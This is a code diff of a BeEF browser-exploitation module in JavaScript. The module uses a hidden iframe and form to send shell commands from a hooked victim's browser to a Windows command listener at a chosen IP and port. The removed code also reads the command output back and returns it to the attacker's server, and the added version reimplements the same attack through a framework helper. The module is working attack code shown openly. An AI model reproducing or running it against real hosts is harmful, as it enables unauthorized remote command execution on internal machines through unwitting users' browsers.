@@ -6,74 +6,41 @@
 
 beef.execute(function() {
 
-	var target_ip = "<%= @ip %>";
-	var target_port = "<%= @port %>";
-	var cmd = "<%= @cmd %>";
-	var timeout = "<%= @command_timeout %>";
-	var internal_counter = 0;
-
-	cmd += " & echo __END_OF_WIN_IPC<%= @command_id %>__ & echo </pre>\"\" & echo <div id='ipc_content'>\"\"";
-
-	var iframe = document.createElement("iframe");
-	iframe.setAttribute("id","ipc_win_window_<%= @command_id %>");
-	iframe.setAttribute("style", "visibility:hidden;width:1px;height:1px;");
-	document.body.appendChild(iframe);
-
-	function do_submit(ip, port, content) {
-
-		var action = "http://" + ip + ":" + port + "/index.html?&cmd&";
-		var parent = window.location.href;
-
-		myform=document.createElement("form");
-		myform.setAttribute("name","data");
-		myform.setAttribute("method","post");
-		myform.setAttribute("enctype","multipart/form-data");
-		myform.setAttribute("action",action);
-		document.getElementById("ipc_win_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform); 
-	
-		myExt = document.createElement("INPUT");
-		myExt.setAttribute("id",<%= @command_id %>);
-		myExt.setAttribute("name",<%= @command_id %>);
-		myExt.setAttribute("value",content);
-		myform.appendChild(myExt);
-		myExt = document.createElement("INPUT");
-		myExt.setAttribute("id","endTag");
-		myExt.setAttribute("name","</div>");
-		myExt.setAttribute("value","echo <scr"+"ipt>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\"ipc_content\").innerHTML);</"+"script>\"\" & exit");
-
-		myform.appendChild(myExt);
-		myform.submit();
+	// validate payload
+	try {
+		var cmd = '<%= @commands.gsub(/'/, "\\\'").gsub(/"/, '\\\"') %>';
+	} catch(e) {
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=malformed payload: '+e.toString());
+		return;
 	}
 
-	function waituntilok() {
-
-		try {
-			if (/#ipc_result=/.test(document.getElementById("ipc_win_window_<%= @command_id %>").contentWindow.location)) {
-				ipc_result = document.getElementById("ipc_win_window_<%= @command_id %>").contentWindow.location.href;
-				output = ipc_result.substring(ipc_result.indexOf('#ipc_result=')+12,ipc_result.lastIndexOf('__END_OF_WIN_IPC<%= @command_id %>__'));
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, "result="+decodeURI(output.replace(/%0A/gi, "<br>")).replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/&lt;br&gt;/gi, "<br>"));
-				document.body.removeChild(iframe);
-				return;
-			} else throw("command results haven't been returned yet");
-		} catch (e) {
-			internal_counter++;
-			if (internal_counter > timeout) {
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Timeout after '+timeout+' seconds');
-				document.body.removeChild(iframe);
-				return;
-			}
-			setTimeout(function() {waituntilok()},1000);
-		}
+	// validate target host
+	var rhost = "<%= @rhost %>";
+	if (!rhost) {
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target host');
+		return;
 	}
 
-	if (!target_port || !target_ip || isNaN(target_port)) {
-		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=malformed target host or target port');
-	} else if (target_port > 65535 || target_port < 0) {
+	// validate target port
+	var rport = "<%= @rport %>";
+	if (!rport || rport > 65535 || rport < 0 || isNaN(rport)) {
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target port');
-	} else {
-		do_submit(target_ip, target_port, cmd);
-		waituntilok();
+		return;
 	}
+
+	// validate timeout
+	var timeout = "<%= @timeout %>";
+	if (isNaN(timeout)) timeout = 30;
+
+	// send commands
+	var win_ipec_form_<%= @command_id %> = beef.dom.createIframeIpecForm(rhost, rport, "/index.html?&cmd&", cmd + " & exit");
+	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Shell commands sent');
+
+	// clean up
+	cleanup = function() {
+		document.body.removeChild(win_ipec_form_<%= @command_id %>);
+	}
+	setTimeout("cleanup()", timeout * 1000);
 
 });
 
